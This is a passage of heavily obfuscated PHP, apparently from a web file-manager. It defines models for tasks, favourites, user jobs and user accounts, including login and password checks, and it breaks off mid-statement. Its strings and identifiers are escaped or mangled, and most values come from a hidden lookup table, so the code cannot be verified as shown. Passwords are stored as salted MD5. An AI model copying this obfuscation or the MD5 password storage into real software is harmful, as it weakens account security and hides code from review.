SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x74\141\x73\x6b\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\x74\171\x70\145", "\145\x76\x65\156\x74", "\x74\151\155\145", "\144\x65\x73\x63", "\x73\171\163\x74\145\155", "\145\156\141\142\x6c\145", "\x6c\141\163\164\x52\165\x6e", "\163\x6f\162\x74"); public function listData($¶Ü¯ó³æ = false, $¶¤ÂğÚú = "\x73\157\x72\164", $”‘‘Ïå = false) { return parent::listData($¶Ü¯ó³æ, $¶¤ÂğÚú, $”‘‘Ïå); } public function add($Ë´³ŞŸä) { $í­±¨ÚÈ =& $_SERVER[•€áå–Õ]; $Çìú÷¾× = $this->findByName($Ë´³ŞŸä[$í­±¨ÚÈ[42]]); if ($Çìú÷¾×) { return !1; } $Ë´³ŞŸä[$í­±¨ÚÈ[1644]] = 0; $Ë´³ŞŸä[$í­±¨ÚÈ[1915]] = $this->getSort(); return parent::insert($Ë´³ŞŸä); } private function getSort() { $¢É±ç„ =& $_SERVER[•€áå–Õ]; $ÇËÀ¨†Æ = parent::listData(); $®şûõ‡• = array_to_keyvalue($ÇËÀ¨†Æ, $¢É±ç„[22], $¢É±ç„[1915]); return empty($®şûõ‡•) ? 0 : max($®şûõ‡•) + 1; } public function update($”ïˆóş¾, $ºªĞøû–) { $æŒôˆ× =& $_SERVER[•€áå–Õ]; $»ŸÖ‰Ş° = $this->listData($”ïˆóş¾); $­¬şˆŒŞ = $this->findByName($ºªĞøû–[$æŒôˆ×[42]]); if (!$»ŸÖ‰Ş° || $­¬şˆŒŞ && $­¬şˆŒŞ[$æŒôˆ×[454]] != $»ŸÖ‰Ş°[$æŒôˆ×[454]]) { return !1; } return parent::update($”ïˆóş¾, $ºªĞøû–); } public function remove($ÌşŠ¿“², $Ûª—ê²¼ = false) { $€ÑÁê² =& $_SERVER[•€áå–Õ]; $çÅÑÅÕ = $this->listData($ÌşŠ¿“²); if (!$çÅÑÅÕ) { return; } if (!$Ûª—ê²¼ && $çÅÑÅÕ[$€ÑÁê²[191]] == $€ÑÁê²[100]) { return !1; } return parent::remove($ÌşŠ¿“²); } public function enable($ÈœĞêş°, $İ¾ÖÙßß) { return $this->update($ÈœĞêş°, array($_SERVER[•€áå–Õ][2328] => $İ¾ÖÙßß)); } public function run($äç²Ô¬‡) { return $this->update($äç²Ô¬‡, array($_SERVER[•€áå–Õ][2340] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ò¥Óİ®) { $¡Îêä =& $_SERVER[•€áå–Õ]; return array($¡Îêä[2002] => array(USER_ID, $¡Îêä[2341])); } protected function listData() { $‰‹ûœ´× =& $_SERVER[•€áå–Õ]; $×¼²õõ = array($‰‹ûœ´×[1684] => USER_ID, $‰‹ûœ´×[537] => 0); $ìÉÆ©ˆÜ = $‰‹ûœ´×[2342]; $—¾ú¸š = $this->field($ìÉÆ©ˆÜ)->where($×¼²õõ)->order($‰‹ûœ´×[2343])->select(); return $—¾ú¸š ? $—¾ú¸š : array(); } protected function resetCache() { } protected function listView() { $¸ŞÅÍûÍ =& $_SERVER[•€áå–Õ]; $ĞÃâç÷á = $this->listData(); $¾¤Š”Õ˜ = array_filter_by_field($ĞÃâç÷á, $¸ŞÅÍûÍ[43], $¸ŞÅÍûÍ[469]); $©¤Š²œï = array_to_keyvalue($¾¤Š”Õ˜, $¸ŞÅÍûÍ[22], $¸ŞÅÍûÍ[96]); if (!$©¤Š²œï) { return $ĞÃâç÷á; } $ÀØØ¼ªÙ = 2000; $÷¤Îú¤Ç = array($¸ŞÅÍûÍ[470] => array($¸ŞÅÍûÍ[471], $©¤Š²œï)); $®Æ“˜”¢ = Model($¸ŞÅÍûÍ[866])->listSource($÷¤Îú¤Ç, $ÀØØ¼ªÙ); $®Æ“˜”¢ = array_merge($®Æ“˜”¢[$¸ŞÅÍûÍ[95]], $®Æ“˜”¢[$¸ŞÅÍûÍ[94]]); $®Æ“˜”¢ = array_to_keyvalue($®Æ“˜”¢, $¸ŞÅÍûÍ[193]); foreach ($ĞÃâç÷á as $Ò½±ä¿» => $øÎî¡Ò) { $‚¬Ê«ƒ¬ = $®Æ“˜”¢[$øÎî¡Ò[$¸ŞÅÍûÍ[96]]]; $‚¬Ê«ƒ¬ = $‚¬Ê«ƒ¬ ? $‚¬Ê«ƒ¬ : array(); $ĞÃâç÷á[$Ò½±ä¿»] = array_merge($‚¬Ê«ƒ¬, $øÎî¡Ò); } return $ĞÃâç÷á; } protected function addFav($Æ…† ‹È, $¹÷Ó÷¤ = '', $å‘×ÍõŒ = "\x73\157\165\x72\143\145") { $Œ¢ºŒŒÖ =& $_SERVER[•€áå–Õ]; $ì·ìĞ»¯ = array($Œ¢ºŒŒÖ[1684] => USER_ID, $Œ¢ºŒŒÖ[537] => 0, $Œ¢ºŒŒÖ[475] => $å‘×ÍõŒ, $Œ¢ºŒŒÖ[474] => $Æ…† ‹È); if ($this->where($ì·ìĞ»¯)->find()) { return !1; } $ì·ìĞ»¯ = array($Œ¢ºŒŒÖ[1684] => USER_ID, $Œ¢ºŒŒÖ[537] => 0); $ò¬ü”’¯ = $this->where($ì·ìĞ»¯)->max($Œ¢ºŒŒÖ[1915]); if (!$ò¬ü”’¯) { $ò¬ü”’¯ = 0; } if (!$¹÷Ó÷¤ && $å‘×ÍõŒ == $Œ¢ºŒŒÖ[469]) { $¼¿®¾¬Ÿ = Model($Œ¢ºŒŒÖ[1374])->where(array($Œ¢ºŒŒÖ[470] => $Æ…† ‹È))->find(); if (!$¼¿®¾¬Ÿ) { return !1; } $¹÷Ó÷¤ = $¼¿®¾¬Ÿ[$Œ¢ºŒŒÖ[42]]; } $¹÷Ó÷¤ = $this->getAutoName($¹÷Ó÷¤); $¥ş‚Ú© = array($Œ¢ºŒŒÖ[1684] => USER_ID, $Œ¢ºŒŒÖ[537] => 0, $Œ¢ºŒŒÖ[473] => $¹÷Ó÷¤, $Œ¢ºŒŒÖ[474] => $Æ…† ‹È, $Œ¢ºŒŒÖ[475] => $å‘×ÍõŒ, $Œ¢ºŒŒÖ[1895] => $ò¬ü”’¯ + 1); return $this->add($¥ş‚Ú©); } protected function remove($Ï–ì×Çô) { $ÚËÕÙ‘» =& $_SERVER[•€áå–Õ]; $Êª‡Øğ„ = array($ÚËÕÙ‘»[1684] => USER_ID, $ÚËÕÙ‘»[472] => $Ï–ì×Çô); return $this->where($Êª‡Øğ„)->delete(); } protected function removeByName($î£Íˆ®) { $°×É¥ÚÇ =& $_SERVER[•€áå–Õ]; $–öøÎ = array($°×É¥ÚÇ[1684] => USER_ID, $°×É¥ÚÇ[473] => $î£Íˆ®, $°×É¥ÚÇ[537] => 0); return $this->where($–öøÎ)->delete(); } protected function rename($”‰œÊ™±, $¡ªµ‚­ú) { $É¢ÄÏ  =& $_SERVER[•€áå–Õ]; if ($”‰œÊ™± == $¡ªµ‚­ú) { return !1; } $ğ–¾Áüï = $this->getAutoName($¡ªµ‚­ú); if ($¡ªµ‚­ú != $ğ–¾Áüï) { return !1; } $Â¶Í‘· = array($É¢ÄÏ [1684] => USER_ID, $É¢ÄÏ [537] => 0, $É¢ÄÏ [42] => $”‰œÊ™±); return $this->where($Â¶Í‘·)->save(array($É¢ÄÏ [42] => $¡ªµ‚­ú)); } protected function resetSort($Ó³ä™ŸÎ) { $İœ Ç¹¶ =& $_SERVER[•€áå–Õ]; $Ó³ä™ŸÎ = is_array($Ó³ä™ŸÎ) ? $Ó³ä™ŸÎ : array(); $«îä”íˆ = array($İœ Ç¹¶[1684] => USER_ID); for ($Í»Øç€ê = 0; $Í»Øç€ê < count($Ó³ä™ŸÎ); $Í»Øç€ê++) { $«îä”íˆ[$İœ Ç¹¶[472]] = $Ó³ä™ŸÎ[$Í»Øç€ê]; $this->where($«îä”íˆ)->save(array($İœ Ç¹¶[1895] => $Í»Øç€ê + 1)); } return !0; } protected function moveTop($‘À¼™Œ¿) { $¥ãéÍÛ£ =& $_SERVER[•€áå–Õ]; $¥â¶“ = array($¥ãéÍÛ£[1684] => USER_ID, $¥ãéÍÛ£[537] => 0); $ÓÊ‰äó« = $this->where($¥â¶“)->where(array($¥ãéÍÛ£[42] => $‘À¼™Œ¿))->find(); if (!$ÓÊ‰äó«) { return; } $ç¾ø½Ç¸ = $this->field($¥ãéÍÛ£[454])->where($¥â¶“)->order($¥ãéÍÛ£[2343])->select(); $ç¾ø½Ç¸ = array_to_keyvalue($ç¾ø½Ç¸, $¥ãéÍÛ£[22], $¥ãéÍÛ£[454]); $¸÷ñË¶Í = $ç¾ø½Ç¸; $ç¾ø½Ç¸ = array_remove_value($ç¾ø½Ç¸, $ÓÊ‰äó«[$¥ãéÍÛ£[454]]); array_unshift($ç¾ø½Ç¸, $ÓÊ‰äó«[$¥ãéÍÛ£[454]]); return $this->resetSort($ç¾ø½Ç¸); } protected function moveBottom($»£­—ø) { $¥£Ò½êé =& $_SERVER[•€áå–Õ]; $“÷éÎ”Ï = array($¥£Ò½êé[1684] => USER_ID, $¥£Ò½êé[537] => 0); $ˆ¦á ‹ø = $this->where($“÷éÎ”Ï)->max($¥£Ò½êé[1915]); $÷ÍÛÈğ = array($¥£Ò½êé[1915] => $ˆ¦á ‹ø + 1); return $this->where($“÷éÎ”Ï)->where(array($¥£Ò½êé[42] => $»£­—ø))->save($÷ÍÛÈğ); } private function getAutoName($çË¤Ÿı) { $Ìá®¶ÎÏ =& $_SERVER[•€áå–Õ]; $Û‡³Ì² = array($Ìá®¶ÎÏ[1684] => USER_ID, $Ìá®¶ÎÏ[537] => 0); $»ü¡¡šÊ = $this->field($Ìá®¶ÎÏ[42])->where($Û‡³Ì²)->select(); $»ü¡¡šÊ = array_to_keyvalue($»ü¡¡šÊ, $Ìá®¶ÎÏ[22], $Ìá®¶ÎÏ[42]); if (!$»ü¡¡šÊ || !in_array($çË¤Ÿı, $»ü¡¡šÊ)) { return $çË¤Ÿı; } for ($¹•¬¡ü€ = 0; $¹•¬¡ü€ < count($»ü¡¡šÊ); $¹•¬¡ü€++) { if (!in_array($çË¤Ÿı . "\50{$¹•¬¡ü€}\51", $»ü¡¡šÊ)) { return $çË¤Ÿı . "\50{$¹•¬¡ü€}\x29"; } } return $çË¤Ÿı . "\x28{$¹•¬¡ü€}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\56\x6a\x6f\x62\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\144\145\x73\143", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\145\154\x66\112\157\142\114\x69\163\164"; public function listData($¸Û——µÃ = false, $Æ§ÙÛæÊ = "\x73\157\x72\164", $á¼›¶ªí = false) { return parent::listData($¸Û——µÃ, $Æ§ÙÛæÊ, $á¼›¶ªí); } public function remove($šİ‹œ¾“) { return parent::remove($šİ‹œ¾“); } public function add($§€Ÿ´–) { $ğ¦Áâ Ş =& $_SERVER[•€áå–Õ]; if ($this->findByName($§€Ÿ´–[$ğ¦Áâ Ş[42]])) { return !1; } $§€Ÿ´–[$ğ¦Áâ Ş[1915]] = $this->getSort(); return parent::insert($§€Ÿ´–); } private function getSort() { $î†À–äŠ =& $_SERVER[•€áå–Õ]; $¶ïĞì´‚ = parent::listData(); $¾Üˆ¬Íå = array_to_keyvalue($¶ïĞì´‚, $î†À–äŠ[22], $î†À–äŠ[1915]); return empty($¾Üˆ¬Íå) ? 0 : max($¾Üˆ¬Íå) + 1; } public function update($Ë¨¡’¦‡, $‡­èèÛŸ) { $æ¹Á±Ø¥ =& $_SERVER[•€áå–Õ]; $’éŞ‘úË = parent::listData($Ë¨¡’¦‡); $Şóî÷ø = $this->findByName($‡­èèÛŸ[$æ¹Á±Ø¥[42]]); if (!$’éŞ‘úË || $Şóî÷ø && $Şóî÷ø[$æ¹Á±Ø¥[454]] != $’éŞ‘úË[$æ¹Á±Ø¥[454]]) { return !1; } return parent::update($Ë¨¡’¦‡, $‡­èèÛŸ); } public function setUserJob($˜²¯Øıõ, $àŒçŸüƒ) { $Ğ²íê³Ô =& $_SERVER[•€áå–Õ]; if (!is_array($àŒçŸüƒ)) { $àŒçŸüƒ = array($àŒçŸüƒ); } $¢ÉşÛ¸Å = parent::listData(); $ˆ•ÍƒÏó = array_to_keyvalue($¢ÉşÛ¸Å, $Ğ²íê³Ô[42]); $š‚ÏÚ¾´ = $Ğ²íê³Ô[433]; foreach ($àŒçŸüƒ as $¦¡³½÷Ï) { if ($ˆ•ÍƒÏó[$¦¡³½÷Ï]) { $š‚ÏÚ¾´ .= $ˆ•ÍƒÏó[$¦¡³½÷Ï][$Ğ²íê³Ô[454]] . $Ğ²íê³Ô[60]; } else { $¿¤ù‰ÔÚ = $this->add($¦¡³½÷Ï); $š‚ÏÚ¾´ .= $¿¤ù‰ÔÚ . $Ğ²íê³Ô[60]; } } $š‚ÏÚ¾´ = rtrim($š‚ÏÚ¾´, $Ğ²íê³Ô[60]); Model($Ğ²íê³Ô[578])->metaSet($˜²¯Øıõ, self::JOB_KEY, $š‚ÏÚ¾´); } public function getUserJob($¤—â°óÜ) { $Ûàùå·ì = Model($_SERVER[•€áå–Õ][578])->metaGet($¤—â°óÜ); return $this->getUserJobInfo($Ûàùå·ì[self::JOB_KEY]); } public function getUserJobInfo($¸—á£¾) { $Óµ£ËãÀ =& $_SERVER[•€áå–Õ]; $İ ç‰€Ú = explode($Óµ£ËãÀ[60], $¸—á£¾); $û›Ôü®Î = parent::listData(); $û›Ôü®Î = array_remove_key($û›Ôü®Î, $Óµ£ËãÀ[227]); $Åø“ß = array(); foreach ($İ ç‰€Ú as $úé°§·Í) { if (isset($û›Ôü®Î[$úé°§·Í])) { $Åø“ß[] = $û›Ôü®Î[$úé°§·Í]; } } return $Åø“ß; } } goto AÉœ¥Åóˆê; AÉœ¥Åóˆê: class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\155\145" => "\165\163\145\x72\x5f\155\145\164\x61", "\155\145\x74\141\106\151\x65\x6c\144" => "\165\163\x65\x72\x49\x44"); protected $simpleField = "\x75\x73\145\x72\x49\104\x2c\156\x69\x63\x6b\x4e\x61\155\145\54\x6e\x61\155\145\54\141\166\x61\164\141\x72\54\x73\145\170\x2c\163\x74\141\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ä§Ã ª) { $äŞ¨àõï =& $_SERVER[•€áå–Õ]; $“ÓÖì   = $äŞ¨àõï[2344]; return array($äŞ¨àõï[1969] => array($ä§Ã ª[0], $“ÓÖì  ), $äŞ¨àõï[1971] => array($ä§Ã ª[0], $“ÓÖì  ), $äŞ¨àõï[2345] => array($ä§Ã ª[0], $“ÓÖì  )); } protected function getInfo($®ËÒ³‰ï, $à±„‹÷ƒ = false) { $ú¨áÜÍ¤ = $this->getInfoSimple($®ËÒ³‰ï); if (!is_array($ú¨áÜÍ¤)) { return array(); } if ($à±„‹÷ƒ) { return $this->_getInfoApply($ú¨áÜÍ¤); } return $this->cacheFunctionGet($_SERVER[•€áå–Õ][1973], $®ËÒ³‰ï); } protected function getInfoFull($±×ĞÀ•, $˜êçÑã’ = false) { $À´ÔñÑ = $this->getInfoSimple($±×ĞÀ•); if (!is_array($À´ÔñÑ)) { return array(); } if ($˜êçÑã’) { return $this->_getInfoApply($À´ÔñÑ, !0); } return $this->cacheFunctionGet($_SERVER[•€áå–Õ][2346], $±×ĞÀ•); } private function _getInfoApply($´°šòÇı, $¾Á¹Á– = false) { $¿®ÎÓ“Ô =& $_SERVER[•€áå–Õ]; if (!$´°šòÇı) { return $´°šòÇı; } $»Àß´Ô = md5($¿®ÎÓ“Ô[2347] . $´°šòÇı[$¿®ÎÓ“Ô[930]] . $¿®ÎÓ“Ô[2348] . $´°šòÇı[$¿®ÎÓ“Ô[42]]); $´°šòÇı = $this->_listDataApplyItem($´°šòÇı); $‰»·ÊÔô = Model($¿®ÎÓ“Ô[1374])->metaGet($´°šòÇı[$¿®ÎÓ“Ô[99]][$¿®ÎÓ“Ô[193]]); $´°šòÇı[$¿®ÎÓ“Ô[2349]] = $»Àß´Ô; $´°šòÇı[$¿®ÎÓ“Ô[99]][$¿®ÎÓ“Ô[2166]] = isset($‰»·ÊÔô[$¿®ÎÓ“Ô[2167]]) ? $‰»·ÊÔô[$¿®ÎÓ“Ô[2167]] : null; if ($¾Á¹Á–) { $´°šòÇı[$¿®ÎÓ“Ô[518]] = $this->metaGet($´°šòÇı[$¿®ÎÓ“Ô[1693]]); } return $´°šòÇı; } protected function getInfoSimple($áº·ÔŞ, $Î«†ğ¯Á = false) { $ñ…íšêÍ =& $_SERVER[•€áå–Õ]; if (!$áº·ÔŞ) { return array(); } if ($Î«†ğ¯Á) { $ª½¦¥˜ú = $this->where(array($ñ…íšêÍ[1693] => intval($áº·ÔŞ)))->find(); if (!is_array($ª½¦¥˜ú)) { return array(); } $ª½¦¥˜ú[$ñ…íšêÍ[2350]] = Action($ñ…íšêÍ[2351])->parseUrl($ª½¦¥˜ú[$ñ…íšêÍ[2350]]); return $ª½¦¥˜ú; } return $this->cacheFunctionGet($ñ…íšêÍ[1974], $áº·ÔŞ); } protected function getInfoSimpleOuter($¦Œ§Ê®) { $¾¦„ÕµÌ =& $_SERVER[•€áå–Õ]; if (!$¦Œ§Ê® || $¦Œ§Ê® == 0) { return array($¾¦„ÕµÌ[1693] => $¾¦„ÕµÌ[224], $¾¦„ÕµÌ[42] => $¾¦„ÕµÌ[175] . LNG($¾¦„ÕµÌ[2352]) . $¾¦„ÕµÌ[177], $¾¦„ÕµÌ[2350] => STATIC_PATH . $¾¦„ÕµÌ[2353]); } $öš¡ïÑÒ = $this->cacheFunctionGet($¾¦„ÕµÌ[1974], $¦Œ§Ê®); $•ûï¤´º = array_field_key($öš¡ïÑÒ, explode($¾¦„ÕµÌ[60], $this->simpleField)); if (!$•ûï¤´º) { return array($¾¦„ÕµÌ[1693] => $¾¦„ÕµÌ[1229], $¾¦„ÕµÌ[42] => $¾¦„ÕµÌ[175] . LNG($¾¦„ÕµÌ[2354]) . $¾¦„ÕµÌ[177], $¾¦„ÕµÌ[2350] => STATIC_PATH . $¾¦„ÕµÌ[2355]); } $•ûï¤´º[$¾¦„ÕµÌ[2350]] = Action($¾¦„ÕµÌ[2351])->parseUrl($•ûï¤´º[$¾¦„ÕµÌ[2350]]); return $•ûï¤´º; } protected function groupUser($±à‡Æ) { } public static function errorLang($“ÒÌÍ‡Õ) { $Æâ´ââ€ =& $_SERVER[•€áå–Õ]; $šıËŒ÷— = array(self::ERROR_USER_NOT_EXISTS => $Æâ´ââ€[2356], self::ERROR_USER_PASSWORD_ERROR => $Æâ´ââ€[2357], self::ERROR_USER_EXIST_NAME => $Æâ´ââ€[2358], self::ERROR_USER_EXIST_PHONE => $Æâ´ââ€[2359], self::ERROR_USER_EXIST_EMAIL => $Æâ´ââ€[2360], self::ERROR_USER_LOGIN_LOCK => $Æâ´ââ€[2361], self::ERROR_IP_NOT_ALLOW => $Æâ´ââ€[2362], self::ERROR_USER_EXIST_NICKNAME => $Æâ´ââ€[2363]); return LNG($šıËŒ÷—[$“ÒÌÍ‡Õ]); } public function getInfoByMeta($ï˜©âà–, $°õ®èêÎ) { $ıÏƒ×½ =& $_SERVER[•€áå–Õ]; $Á‚Š§§ = Model($ıÏƒ×½[2364])->where(array($ıÏƒ×½[106] => $ï˜©âà–, $ıÏƒ×½[429] => $°õ®èêÎ))->find(); if ($Á‚Š§§) { return $this->getInfo($Á‚Š§§[$ıÏƒ×½[1693]]); } return !1; } public function userLoginCheck($­‰›ıĞ, $ø·Ç…±ä) { $Ë–ÕÜÖ =& $_SERVER[•€áå–Õ]; $£‚ºıã± = $this->userLoginFind($­‰›ıĞ); if (!$£‚ºıã±) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($£‚ºıã±[$Ë–ÕÜÖ[1693]], $ø·Ç…±ä)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($£‚ºıã±[$Ë–ÕÜÖ[1693]]); } public function userLoginFind($»öëšÖ) { $¦±£â§œ =& $_SERVER[•€áå–Õ]; $ÇÚÅ¹Ü¥ = array($¦±£â§œ[42] => $»öëšÖ, $¦±£â§œ[2174] => $»öëšÖ, $¦±£â§œ[360] => $»öëšÖ, $¦±£â§œ[2365] => $»öëšÖ, $¦±£â§œ[1041] => $¦±£â§œ[1043]); if ($this->nickNameRpt()) { unset($ÇÚÅ¹Ü¥[$¦±£â§œ[2174]]); } return $this->where($ÇÚÅ¹Ü¥)->find(); } public function clearCache($¯‚á‰™¼) { $Ÿƒ¤ÄæÃ =& $_SERVER[•€áå–Õ]; $this->cacheFunctionClear($Ÿƒ¤ÄæÃ[1973], $¯‚á‰™¼); $this->cacheFunctionClear($Ÿƒ¤ÄæÃ[1974], $¯‚á‰™¼); $this->cacheFunctionClear($Ÿƒ¤ÄæÃ[2346], $¯‚á‰™¼); } public function userPasswordCheck($¾–­áÕ¨, $–œ´°‚µ) { $ü•İÓÅ =& $_SERVER[•€áå–Õ]; $ Š›¥³ = $this->where(array($ü•İÓÅ[1693] => intval($¾–­áÕ¨)))->find(); $ÆäµáÍ¥ = $this->metaGet($¾–­áÕ¨); $ö‡ÂÛ»ı = isset($ÆäµáÍ¥[$ü•İÓÅ[2366]]) ? $ÆäµáÍ¥[$ü•İÓÅ[2366]] : $ü•İÓÅ[22]; if (md5($ö‡ÂÛ»ı . trim($–œ´°‚µ)) !== $ Š›¥³[$ü•İÓÅ[930]]) { return !1; } return !0; } public function userAdd($ó¨æÄÚï) { $§ ¸—¼€ =& $_SERVER[•€áå–Õ]; $‰ˆš¹İ = array($§ ¸—¼€[473] => $ó¨æÄÚï[$§ ¸—¼€[42]], $§ ¸—¼€[2367] => $ó¨æÄÚï[$§ ¸—¼€[2093]], $§ ¸—¼€[2368] => isset($ó¨æÄÚï[$§ ¸—¼€[360]]) ? $ó¨æÄÚï[$§ ¸—¼€[360]] : $§ ¸—¼€[22], $§ ¸—¼€[2369] => isset($ó¨æÄÚï[$§ ¸—¼€[2365]]) ? $ó¨æÄÚï[$§ ¸—¼€[2365]] : $§ ¸—¼€[22], $§ ¸—¼€[2370] => isset($ó¨æÄÚï[$§ ¸—¼€[2174]]) ? $ó¨æÄÚï[$§ ¸—¼€[2174]] : $ó¨æÄÚï[$§ ¸—¼€[42]], $§ ¸—¼€[2371] => isset($ó¨æÄÚï[$§ ¸—¼€[2350]]) ? $ó¨æÄÚï[$§ ¸—¼€[2350]] : $§ ¸—¼€[22], $§ ¸—¼€[2372] => isset($ó¨æÄÚï[$§ ¸—¼€[2373]]) ? $ó¨æÄÚï[$§ ¸—¼€[2373]] : 1, $§ ¸—¼€[2374] => $ó¨æÄÚï[$§ ¸—¼€[930]], $§ ¸—¼€[1975] => isset($ó¨æÄÚï[$§ ¸—¼€[1878]]) ? $ó¨æÄÚï[$§ ¸—¼€[1878]] : 1024 * 1024 * 20, $§ ¸—¼€[1976] => 0, $§ ¸—¼€[2375] => 0, $§ ¸—¼€[2020] => isset($ó¨æÄÚï[$§ ¸—¼€[791]]) ? $ó¨æÄÚï[$§ ¸—¼€[791]] : 1); if (!empty($ó¨æÄÚï[$§ ¸—¼€[1693]])) { $‰ˆš¹İ[$§ ¸—¼€[1693]] = $ó¨æÄÚï[$§ ¸—¼€[1693]]; } $ùÒÙèŞ¥ = $this->_checkExist($ó¨æÄÚï); if ($ùÒÙèŞ¥ !== !0) { return $ùÒÙèŞ¥; } if (!empty($‰ˆš¹İ[$§ ¸—¼€[2350]]) && strlen($‰ˆš¹İ[$§ ¸—¼€[2350]]) > 255) { $‰ˆš¹İ[$§ ¸—¼€[2350]] = $§ ¸—¼€[22]; } $¶¸¯Ò®ë = $this->add($‰ˆš¹İ); $Õ Í¶şú = array($§ ¸—¼€[2374] => $‰ˆš¹İ[$§ ¸—¼€[930]], $§ ¸—¼€[2370] => $‰ˆš¹İ[$§ ¸—¼€[2174]]); $this->userEdit($¶¸¯Ò®ë, $Õ Í¶şú); Model($§ ¸—¼€[1374])->userRootAdd($¶¸¯Ò®ë); return $¶¸¯Ò®ë; } protected function userEditTest($£¥çš„½, $ùÅ‡—¬ß) { return $this->call($_SERVER[•€áå–Õ][2376], $£¥çš„½, $ùÅ‡—¬ß); } protected function userEdit($½õŠ­ÑÎ, $¬½Çİä) { $¦¶üÊî³ =& $_SERVER[•€áå–Õ]; $ ì•ŞĞ = $this->getInfoSimple($½õŠ­ÑÎ); if (!$ ì•ŞĞ) { return !1; } $ÁœŞíëó = $this->_checkExist($¬½Çİä, $½õŠ­ÑÎ); if ($ÁœŞíëó !== !0) { return $ÁœŞíëó; } if (isset($¬½Çİä[$¦¶üÊî³[930]]) && trim($¬½Çİä[$¦¶üÊî³[930]]) != $¦¶üÊî³[22]) { $ÒæşãÜİ = $this->metaGet($½õŠ­ÑÎ); if (empty($ÒæşãÜİ[$¦¶üÊî³[2366]])) { $ÒæşãÜİ[$¦¶üÊî³[2366]] = rand_string(10); Model($¦¶üÊî³[557])->metaSet($½õŠ­ÑÎ, $¦¶üÊî³[2366], $ÒæşãÜİ[$¦¶üÊî³[2366]]); } $¬½Çİä[$¦¶üÊî³[930]] = md5($ÒæşãÜİ[$¦¶üÊî³[2366]] . trim($¬½Çİä[$¦¶üÊî³[930]])); } else { unset($¬½Çİä[$¦¶üÊî³[930]]); } if (!empty($¬½Çİä[$¦¶üÊî³[2350]]) && strlen($¬½Çİä[$¦¶üÊî³[2350]]) > 255) { $¬½Çİä[$¦¶üÊî³[2350]] = $¦¶üÊî³[22]; } $this->where(array($¦¶üÊî³[1684] => $½õŠ­ÑÎ))->save($¬½Çİä); if (isset($¬½Çİä[$¦¶üÊî³[2174]])) { $this->setNamePinyin($½õŠ­ÑÎ, $¬½Çİä[$¦¶üÊî³[2174]]); } $this->clearCache($½õŠ­ÑÎ); return !0; } public function setNamePinyin($âç †, $Ÿò­Ñœ = false) { $ÁÓï¸³ß =& $_SERVER[•€áå–Õ]; if (!$Ÿò­Ñœ) { $“Û÷óÑ› = $this->getInfoSimple($âç †); $Ÿò­Ñœ = $“Û÷óÑ›[$ÁÓï¸³ß[2174]] ? $“Û÷óÑ›[$ÁÓï¸³ß[2174]] : $“Û÷óÑ›[$ÁÓï¸³ß[42]]; } $ãîõëäª = Model($ÁÓï¸³ß[578]); if (!Input::check($Ÿò­Ñœ, $ÁÓï¸³ß[634])) { return $ãîõëäª->metaSet($âç †, array($ÁÓï¸³ß[517] => $ÁÓï¸³ß[22], $ÁÓï¸³ß[516] => $ÁÓï¸³ß[22])); } return $ãîõëäª->metaSet($âç †, array($ÁÓï¸³ß[517] => str_replace($ÁÓï¸³ß[63], $ÁÓï¸³ß[22], Pinyin::get($Ÿò­Ñœ)), $ÁÓï¸³ß[516] => Pinyin::get($Ÿò­Ñœ, $ÁÓï¸³ß[635]))); } private function nickNameRpt() { $àÆÁ¨¡© =& $_SERVER[•€áå–Õ]; $µ³‚Æü¶ = Model($àÆÁ¨¡©[811])->get($àÆÁ¨¡©[2377]); $Ÿôãˆ± = $GLOBALS[$àÆÁ¨¡©[16]][$àÆÁ¨¡©[436]][$àÆÁ¨¡©[2377]]; $Ã€„ÚÙï = !is_null($µ³‚Æü¶) ? $µ³‚Æü¶ : $Ÿôãˆ±; return !!$Ã€„ÚÙï; } private function _checkExist($èÜ¸ŸÓ¦, $Éæşöâ€ = false) { $Ô¼¯£¼Ş =& $_SERVER[•€áå–Õ]; $–¡ÜÛó© = array($Ô¼¯£¼Ş[42] => UserModel::ERROR_USER_EXIST_NAME, $Ô¼¯£¼Ş[2174] => UserModel::ERROR_USER_EXIST_NICKNAME, $Ô¼¯£¼Ş[360] => UserModel::ERROR_USER_EXIST_EMAIL, $Ô¼¯£¼Ş[2365] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($–¡ÜÛó©[$Ô¼¯£¼Ş[2174]]); } $ä“˜Ñ‚â = $Éæşöâ€ ? array($Ô¼¯£¼Ş[1693] => array($Ô¼¯£¼Ş[2378], $Éæşöâ€)) : array(); foreach ($–¡ÜÛó© as $åÚŸš‡é => $¡·õİğ) { $Ç¤÷±İÍ = array(); foreach ($–¡ÜÛó© as $Îš›™œ“ => $İÓôÎá…) { if (isset($èÜ¸ŸÓ¦[$Îš›™œ“]) && $èÜ¸ŸÓ¦[$Îš›™œ“]) { $Ç¤÷±İÍ[] = $èÜ¸ŸÓ¦[$Îš›™œ“]; } } if (!$Ç¤÷±İÍ) { continue; } $ É½™¥ = array_merge(array($åÚŸš‡é => array($Ô¼¯£¼Ş[17], $Ç¤÷±İÍ)), $ä“˜Ñ‚â); $â§¥ß— = $this->where($ É½™¥)->find(); if ($â§¥ß—) { return $¡·õİğ; } } return !0; } public function userListInfo($ı®’²µË) { $•éÍı¿â =& $_SERVER[•€áå–Õ]; $Õƒş„×› = array(); $ı®’²µË = is_array($ı®’²µË) ? array_unique($ı®’²µË) : array(); if (!$ı®’²µË) { return $Õƒş„×›; } if (count($ı®’²µË) < 20) { foreach ($ı®’²µË as $íî£Úé¤) { $Õƒş„×›[$íî£Úé¤ . $•éÍı¿â[22]] = 